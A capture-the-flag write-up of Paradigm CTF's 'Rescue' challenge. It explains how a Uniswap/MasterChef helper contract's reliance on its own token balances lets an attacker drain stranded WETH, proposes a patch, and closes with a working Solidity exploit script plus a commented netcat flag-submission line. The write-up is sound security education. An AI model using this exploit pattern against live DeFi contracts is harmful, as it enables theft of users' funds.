---
weight: 1
title: "Paradigm CTF - Rescue"
date: 2022-12-30
tags: ["CTF", "DEFI", "UNISWAP"]
draft: false
author: "Ethnical"
authorLink: "https://twitter.com/EthnicalInfo"
description: "I accidentally sent some WETH to a contract, can you help me?"
images: []
categories: ["Web3"]
resources:
- name: "featured-image-preview"
  src: "Paradigm.png"
lightgallery: true

toc:
  auto: false
---
<!--more-->


> I accidentally sent some WETH to a contract, can you help me?
> 

Here, we have 3 files here `MasterChefHelper.sol` `Setup.sol` `UniswapV2Like.sol` 

The vulnerable contract is `MasterChefHelper.sol` (`UniswapV2Like.sol` is **useless** here).

First, The `Setup.sol` contract is creating the CTF, the contract is creating a vulnerable fork of a MasterChef (from Sushi). 

Then we can see the *whoops* comment in the code below, because the admin sent **10 weth** at the wrong address... So we have to steal the 10 weth from the `MasterChefHelper`.

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import './MasterChefHelper.sol';

interface WETH9 is ERC20Like {
  function deposit() external payable;

  function withdraw(uint256) external;
}

contract Setup {
  WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  MasterChefHelper public immutable mcHelper;

  constructor() payable {
    mcHelper = new MasterChefHelper();
    weth.deposit{value: 10 ether}();
    weth.transfer(address(mcHelper), 10 ether); // whoops
  }

  function isSolved() external view returns (bool) {
    return weth.balanceOf(address(mcHelper)) == 0;
  }
}
```

Let’s dive into the code of `MasterChefHelper.sol` 

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./UniswapV2Like.sol";

interface ERC20Like {
    function transferFrom(address, address, uint) external;
    function transfer(address, uint) external;
    function approve(address, uint) external;
    function balanceOf(address) external view returns (uint);
}

interface MasterChefLike {
    function poolInfo(uint256 id) external returns (
        address lpToken,
        uint256 allocPoint,
        uint256 lastRewardBlock,
        uint256 accSushiPerShare
    );
}

contract MasterChefHelper {

    MasterChefLike public constant masterchef = MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);
    UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external {
        (address lpToken,,,) = masterchef.poolInfo(poolId);
        address tokenOut0 = UniswapV2PairLike(lpToken).token0();
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();

        ERC20Like(tokenIn).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);
        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);

        // swap for both tokens of the lp pool
        _swap(tokenIn, tokenOut0, amountIn / 2);
        _swap(tokenIn, tokenOut1, amountIn / 2);

        // add liquidity and give lp tokens to msg.sender
        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);
    }

    function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal {
        (,, uint256 amountOut) = router.addLiquidity(
            token0, 
            token1, 
            ERC20Like(token0).balanceOf(address(this)), 
            ERC20Like(token1).balanceOf(address(this)), 
            0, 
            0, 
            msg.sender, 
            block.timestamp
        );
        require(amountOut >= minAmountOut);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
```

## 1. What the contract does?

### The function `swapTokenForPoolToken`

This is the function, we will use to the steal the **10 weth** from the `MasterChefHelper`.

```solidity
 function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external {
        (address lpToken,,,) = masterchef.poolInfo(poolId); // get the LPaddress from the poolInfo
        address tokenOut0 = UniswapV2PairLike(lpToken).token0(); //get the token0 of the pool
        address tokenOut1 = UniswapV2PairLike(lpToken).token1(); //get the token0 of the pool

        ERC20Like(tokenIn).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);
        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn); //Tranfer the tokenIn to the masterchef

        // swap for both tokens of the lp pool
        _swap(tokenIn, tokenOut0, amountIn / 2);  //swap half of the amount
        _swap(tokenIn, tokenOut1, amountIn / 2); //swap half of the amount

        // add liquidity and give lp tokens to msg.sender
        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);
    }
```

So this function swap our **tokenIn** (for example `USDC` **to** `token0` & `token1` of the Liquidity Pool given into `poolId`). 

Then will make a Liquidity Pool Token (LP) from `token1` and `token0` and sending back to `msg.sender`.

This is really similar to the  `Zap` method from StellaSwap on Moonbeam 😎

![Untitled](Untitled.png "Zap feature (from Stellaswap a DeFi Protocol).")

But in our CTF,  we cannot **swap identical tokens** (for example, if `tokenIn` is `USDC` the pool has to be something that doesn’t contain any USDC inside otherwise the `_swap(tokenIn, tokenOut1, amountIn / 2);` will revert with the message `IDENTICAL SWAP TOKEN`.

So this pool will work DAI/WETH but USDC/WETH will revert.

So now we understood that, our attack goal will be to trigger `_addLiquidity(tokenOut0, tokenOut1, minAmountOut);`  with `token0` *DAI* and `token1` *WETH* to get the 10 *WETH* inside the contract. 

```solidity
function _addLiquidity(
    address token0,
    address token1,
    uint256 minAmountOut
  ) internal {
    (, , uint256 amountOut) = router.addLiquidity(token0, token1, ERC20Like(token0).balanceOf(address(this)), ERC20Like(token1).balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);
    require(amountOut >= minAmountOut, 'minAmoun to slow');
  }
```

The vulnerability is here because the `MasterChefHelper` is using `ERC20Like(token1).balanceOf(address(this))` & `ERC20Like(token0).balanceOf(address(this))`.

> A **check** on the `swap` return value should be implemented here! 

```solidity
//Eexplanation code
uint256 realvalue0 = _swap(tokenIn, tokenOut0, amountIn / 2);
uint256 realvalue1 = _swap(tokenIn, tokenOut1, amountIn / 2);

// DO NOT USE IN PROD
(, , uint256 amountOut) = router.addLiquidity(token0, token1,
ERC20Like(token0).balanceOf(address(this)), 
ERC20Like(token1).balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);

// Patch version
(, , uint256 amountOut) = router.addLiquidity(token0, token1,
realvalue0, 
realvalue1, 0, 0, msg.sender, block.timestamp);

```

Using `BalanceOf(address(this))`is dangerous here because if you have enough `token0` or `token1` then the pool will be created and sent back the `msg.sender`.

Now, we know that we have to swap some *WETH* to *USDC* and find a pool that doesn’t contain *USDC* inside but *WETH* is **mandatory** (as we said before we will choose **DAI/WETH**).

Perfect! the pool number `2` match exactly what we need :

![Untitled](Untitled%201.png "Etherscan PoolInfo DAI/WETH address")

If we just call the `swapTokenForPoolToken()` with some `USDC` it will just create a “normal” LP with USDC/2 ⇒ `token0` & USDC/2 ⇒ `token1`.  And you cannot withdraw the 10 *WETH*. 

But the trick here is to send more *DAI* to `MasterChefHelper` directly. 

So as we said last time `MasterChefHelper` will use `ERC20Like(token0).balanceOf(address(this))` and create a pool with the total value and sending back to you 😉

Then the pool will be empty! We then just has to flag the challenge using `netcat`! 

![Untitled](Untitled%202.png "Using netcat to get the flag!")



### Socials & Payload

| Discord (Join us!) | Github | Twitter | 
| ----------------------------- | ------ | ---------- | 
| https://discord.gg/54Q9pnpQcV |  https://github.com/Ethnical/Swek3      |  https://twitter.com/EthnicalInfo |



```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//import 'forge-std/Script.sol';

import 'src/Setup.sol';

//import 'forge-std/Test.sol';

contract ContractScript {
  function setUp() public {}

  function run() public payable {
    Setup s = Setup(0x8ceB77a963474dbA300421fc8E8F91831C776dC3);

    MasterChefHelper M = s.mcHelper();

    MasterChefLike ML = M.masterchef();

    WETH9 wet = s.weth();
    uint256 max = type(uint256).max;

    //echo "1\nd85d44b338644cda1cbad7a66918f61ca5356c9f589be69b2a62eb\n" | nc 34.123.187.206 31337
    //vm.deal(address(this), 5000 ether);
    //vm.addr(0xb746dd73a823761682724bcf5f06360680943e14a2e2a212c111c2a0dd469090);

    wet.deposit{value: 1000 ether}();
    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address[] memory path = new address[](2);
    path[0] = address(wet);
    path[1] = address(dai);

    address[] memory path2 = new address[](2);
    path2[0] = address(wet);
    path2[1] = address(usdc);

    wet.approve(address(M.router()), 10000 ether); //Approve router
    //wet.approve(0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f, 10000 ether); //approve pool
    ERC20Like(dai).approve(address(M), 100000000000 ether);
    ERC20Like(usdc).approve(address(M), 100000000000 ether);

    M.router().swapExactTokensForTokens(500 ether, 100_000 ether, path, address(this), 10 ether); //Swap WETH TO DAI

    M.router().swapExactTokensForTokens(500 ether, 100_000 * 10**6, path2, address(this), 10 ether); //Swap WETH TO DAI

    M.swapTokenForPoolToken(2, address(usdc), 10_000 * 10**6, 10 ether);

    ERC20Like(dai).transfer(address(M), 35_000 ether);
    M.swapTokenForPoolToken(2, address(usdc), 100, 100);
    //M.swapTokenForPoolToken(2, address(usdc), 100, 100);
    //M.swapTokenForPoolToken(2, address(usdc), 100, 100);

    //M.swapTokenForPoolToken(0, address(usdc), 1, 1 * 10**6);

    //M.router().swapExactTokensForTokens(500 ether, 1 ether, path2, address(this), max); //Swap WETH TO USDC
  }

  fallback() external payable {}
}
```

